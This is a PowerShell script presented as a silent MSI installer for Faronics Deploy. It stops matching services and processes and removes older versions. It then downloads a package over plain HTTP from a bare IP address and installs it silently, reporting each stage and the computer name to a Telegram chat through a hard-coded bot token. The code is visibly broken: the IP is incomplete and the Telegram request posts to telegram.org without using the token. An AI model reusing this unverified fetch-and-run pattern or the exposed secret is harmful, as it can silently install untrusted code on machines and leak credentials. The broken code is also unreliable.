# ==============================================================================
# Script Name: install.ps1
# Description: Universal Dynamic Silent Installer Optimized for Faronics Deploy
# ==============================================================================

# Force PowerShell output to treat text as UTF-8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# 1. TELEGRAM CONFIGURATION
$BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
$ChatID   = "6867549905"

# 2. APPLICATION CONFIGURATION - PASTE ANY MSI LINK HERE
$MsiUrl    = "http://50.114.179"
$TempDir   = "C:\Windows\Temp"

# --- NATIVE URI FILENAME EXTRACTION (No String Splitting) ---
$UriObject   = [System.Uri]$MsiUrl
$FileName    = [System.IO.Path]::GetFileName($UriObject.AbsolutePath)
$AppName     = [System.IO.Path]::GetFileNameWithoutExtension($UriObject.AbsolutePath)

# Fallback validation if the URL structure doesn't expose a clear .msi name
if ($FileName -notlike "*.msi") {
    $FileName = "downloaded_package.msi"
    $AppName  = "CustomApplication"
}

$MsiPath   = Join-Path $TempDir $FileName
$LogPath   = "C:\Windows\Temp\$($AppName)_Install.log"
$Computer  = $env:COMPUTERNAME

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# Function to send Telegram messages safely via JSON POST
function Send-TelegramAlert {
    param([string]$Message)
    try {
        $Payload = @{
            chat_id = $ChatID
            text    = $Message
        } | ConvertTo-Json -Compress -Depth 2

        Invoke-RestMethod -Uri "https://telegram.org" `
                          -Method Post `
                          -ContentType "application/json; charset=utf-8" `
                          -Body $Payload -ErrorAction Stop | Out-Null
    } catch {
        Write-Warning "Failed to send Telegram notification: $($_.Exception.Message)"
    }
}

# --- MILESTONE 1: SCRIPT LAUNCH ---
Send-TelegramAlert -Message "[🚀] $AppName Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."

# 3. ANTI-1603 CONFLICT CLEANUP (Fast Registry Sweeper - Bypasses Win32_Product)
try {
    Write-Output "Stopping any existing background services..."
    Get-Service -Name "*$AppName*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
    Get-Process -Name "*$AppName*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

    Write-Output "Scanning system registries to remove older conflicting $AppName packages..."
    # Scans the safe, instant Registry paths instead of querying the WMI engine
    $RegPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    $OldApps = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | 
               Where-Object { $_.DisplayName -like "*$AppName*" -and $_.UninstallString -like "*msiexec*" }

    foreach ($App in $OldApps) {
        $IdentifyingNumber = $App.PSChildName
        Write-Output "Uninstalling existing client GUID: $IdentifyingNumber"
        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old version ($($App.DisplayName)) on PC: $Computer"
        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $IdentifyingNumber /qn /norestart" -Wait -NoNewWindow
    }
} catch {
    Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
}

# --- MILESTONE 2: DOWNLOAD INITIATION ---
Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the $FileName package..."

# 4. Download Logic
try {
    Write-Output "Downloading MSI package..."
    if (Test-Path $MsiPath) { Remove-Item $MsiPath -Force -ErrorAction SilentlyContinue }

    # Downloads using your raw unedited $MsiUrl string directly
    Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath -UseBasicParsing -ErrorAction Stop

    if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -lt 1024) {
        throw "Downloaded file is missing or too small."
    }
    Write-Output "Download completed successfully."
}
catch {
    $Msg = "[!] $AppName Download FAILED`nPC: $Computer`nError: $($_.Exception.Message)"
    Send-TelegramAlert -Message $Msg
    exit 1
}

# --- MILESTONE 3: INSTALLATION INITIATION ---
Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the $FileName package to the silent background execution engine..."

# 5. Installation Logic
if (Test-Path $MsiPath) {
    Write-Output "Starting silent installation..."
    $Arguments = "/i `"$MsiPath`" /qn /norestart /L*V `"$LogPath`""

    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Wait -NoNewWindow -PassThru

    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue

    # --- MILESTONE 4: FINAL EVALUATION ---
    if ($Process.ExitCode -eq 0 -or $Process.ExitCode -eq 3010) {
        $Status = if ($Process.ExitCode -eq 3010) { "Installed successfully (Reboot Pending)." } else { "Installed successfully." }
        $Msg = "[+] $AppName Deployment Success`nPC: $Computer`nStatus: $Status"
        Send-TelegramAlert -Message $Msg
        exit 0
    }
    else {
        $Msg = "[!] $AppName Deployment FAILED`nPC: $Computer`nExit Code: $($Process.ExitCode)`nCheck local log at: $LogPath"
        Send-TelegramAlert -Message $Msg
        exit $Process.ExitCode
    }
} else {
    $Msg = "[!] $AppName Deployment FAILED`nPC: $Computer`nError: File download validation failed."
    Send-TelegramAlert -Message $Msg
    exit 1
}
